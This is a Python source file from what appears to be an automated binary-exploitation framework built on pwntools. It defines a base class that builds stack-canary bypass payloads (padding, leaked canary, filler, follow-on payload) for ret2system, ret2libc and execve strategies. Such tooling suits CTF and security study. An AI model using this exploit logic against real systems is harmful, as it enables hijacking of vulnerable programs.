"""P7.10: CanaryStrategy — base class for all 7 canary-tainted strategies.

Per ``rebuild.md`` §6.8 P7.10 + ``refactor.md`` §3.2.2, all canary
strategies share a common payload frame::

    [padding 'A' bytes] [canary value (pNN)] [filler 'B' bytes] [payload_after_canary]

The leak step (where v3.1 inline-leaked the canary via a
``%{c}$p`` format-string probe inside each strategy) is **gone**:
P5.3 ``detect/canary.py`` runs ``canary_fuzz`` once at the
top-level and writes :class:`CanaryInfo` into ``ctx.canary``.
P7.10 strategies consume ``ctx.canary`` directly.

Why this base class exists
--------------------------
The 7 v3.1 canary variants (ret2system x32/x64,
ret2libc_put x32/x64, ret2libc_write x32/x64, execve_syscall)
all share the ``[padding | canary | filler]`` frame and the
fact that they need ``ctx.canary is not None``.  Encoding
this in a base class means the 7 leaf files stay at ~30 lines
each (per spec §6.8 P7.10 acceptance: ``wc -l
autopwn/exp/strategies/*.py`` < 150 行).

What the base does NOT do
-------------------------
- It does **not** call ``build_payload`` itself.  Each
  subclass overrides :meth:`run` to drive its own primitive
  (1-stage ret2system, 2-stage ret2libc_put, etc.) using
  :meth:`frame_after_canary` to build the canary-aware
  payload.
- It does **not** choose IO factory (``process`` vs
  ``remote``).  Subclasses wire that up themselves (we want
  the same pattern as P7.3-P7.9 — explicit remote/local
  pairing per strategy file).
"""
from __future__ import annotations

from pwn import p32, p64

from autopwn.context import CanaryInfo
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import CANARY


class CanaryStrategy(ExploitStrategy):
    """Base for all 14 canary-tainted strategies (7 files × local+remote).

    All canary strategies share:

      * :attr:`priority = CANARY = 200` (highest; per 附录 A).
      * :attr:`requires_canary = True` (inherited from base.py
        default; see :meth:`matches` in base.py — returns
        ``False`` when ``ctx.canary is None``).
      * :attr:`requires` includes ``("padding",)`` — every
        canary strategy needs a BOF offset to slide the
        padding into.  The actual canary value is read from
        ``ctx.canary.value`` (not a :attr:`requires` entry
        because base.py only checks ``ctx.X is truthy``,
        not the specific struct).
    """

    priority = CANARY  # 200
    requires_canary = True  # base.py matches() returns False when ctx.canary is None
    requires = ("padding",)  # padding > 0 required (else no BOF)

    def frame_after_canary(self, ctx, payload_after_canary: bytes) -> bytes:
        """Build the canary-aware payload frame.

        Equivalent to v3.1's ``payload = flat([asm('nop') *
        padding, pNN(c.value), b'B' * c.diff,
        payload_after_canary])`` pattern (replicated in 14
        v3.1 functions with subtle ``b'B' * c.diff`` vs
        ``b'AAAA' * c.diff`` typos; P7.10 normalizes to
        ``b'B' * c.diff`` per spec P7.10 example).

        The bit-width of the canary pNN wrapper is chosen by
        ``ctx.binary.bit``: 32-bit binary uses ``p32``,
        64-bit uses ``p64``.  This **diverges** from v3.1
        (v3.1 always used ``p32`` for ``ret2_system_canary_x32``
        and ``p64`` for the x64 variants, which happened to
        be correct, but mixed up in ``execve_canary_syscall``
        where v3.1 unconditionally uses ``p32`` regardless of
        the binary — a latent bug for 64-bit execve).  P7.10
        reads ``ctx.binary.bit`` to be explicit.

        Returns:
            ``b'A' * ctx.padding + pNN(canary) +
            b'B' * c.diff + payload_after_canary``.
        """
        c: CanaryInfo = ctx.canary
        if ctx.binary.bit == 64:
            canary_bytes = p64(c.value)
        else:
            canary_bytes = p32(c.value)
        return (
            b"A" * ctx.padding
            + canary_bytes
            + b"B" * c.diff
            + payload_after_canary
        )


__all__ = ["CanaryStrategy"]
